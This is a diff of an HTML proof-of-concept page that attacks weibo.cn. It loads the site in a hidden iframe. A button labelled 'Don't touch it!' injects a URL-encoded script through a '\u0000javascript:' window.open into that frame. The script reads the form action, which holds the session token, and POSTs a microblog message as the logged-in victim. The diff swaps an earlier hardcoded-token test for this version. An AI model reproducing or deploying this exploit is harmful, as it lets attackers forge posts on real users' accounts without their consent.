@@ -25,19 +25,18 @@ function weibocom(){
 }
 
 function weibocn(){
-    var xhr=new XMLHttpRequest();
-    xhr.onreadystatechange=function(){
-        if(xhr.readyState==4){
-            alert('hehe!');
-        }
-    };
-    xhr.open('POST','/mblog/sendmblog?st=0d5f',true);
-    xhr.setRequestHeader('Content-type','application/x-www-form-urlencoded');
-    xhr.send('content=@xavierskip 我错了');
+var u=document.getElementsByTagName('form')[0].action;
+var xhr=new XMLHttpRequest();
+xhr.onreadystatechange=function(){
+    if(xhr.readyState==4){
+        alert('hehe!');
+    }
+};
+xhr.open('POST',u,true);
+xhr.setRequestHeader('Content-type','application/x-www-form-urlencoded');
+xhr.send('content=@xavierskip haha!');
 }
-function geturl(){
-
-}
+function location(){};
 </script>
 <style type="text/css">
     .button{
@@ -52,11 +51,9 @@ function geturl(){
 </style>
 </head>
 <body>
-<iframe name="t1" src="http://weibo.cn" style="display:none" security="restricted" sandbox=""></iframe>
-<input type=button value="测试1" class="button" 
-onclick=window.open('\u0000javascript:var%20a%3D%24%28%27form%27%29.action%3Balert%28u%29%3B','t1')>
-
-<input type=button value="测试2" class="button" 
-onclick=window.open("\u0000javascript:alert(document.body)","t1")>
+<iframe name=m style="display:none"src="http://weibo.cn"></iframe>
+<p>WARING!!</p>
+<input type=button value="Don't touch it!" class="button" 
+onclick=window.open('\u0000javascript:var%20u%3Ddocument.getElementsByTagName%28%27form%27%29%5B0%5D.action%3Bvar%20xhr%3Dnew%20XMLHttpRequest%28%29%3Bxhr.onreadystatechange%3Dfunction%28%29%7Bif%28xhr.readyState%3D%3D4%29%7Balert%28%27hehe%21%27%29%3B%7D%7D%3Bxhr.open%28%27POST%27%2Cu%2Ctrue%29%3Bxhr.setRequestHeader%28%27Content-type%27%2C%27application/x-www-form-urlencoded%27%29%3Bxhr.send%28%27content%3D@xavierskip%20%E6%88%91%E9%94%99%E4%BA%86%21%27%29%3B','m') >
 </body>
 </html>
